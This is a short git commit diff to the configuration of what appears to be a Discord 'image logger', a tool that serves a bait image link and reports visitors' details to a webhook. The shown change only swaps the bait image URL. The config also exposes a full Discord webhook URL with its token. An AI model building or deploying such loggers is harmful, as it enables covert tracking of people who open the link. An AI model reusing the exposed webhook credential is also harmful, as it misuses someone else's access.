36820e03dddf74ce3a388c32f2e97d6ab10f9ac0
kacsaweb <adamsomogyi651@gmail.com>
2026-02-21 18:57:45 +0100

    Update image URL in configuration

--- apy/image.py
+++ apy/image.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1474108801425871081/N1AcsrRIypQvhpn2bImbCMw4j4E8PXt_d0vEI_hcfblXeDAipbNZwojYIBs7HH_r0Vlv",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "image": "https://tenor.com/hu/view/happy-day-gif-2891498032241483575", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
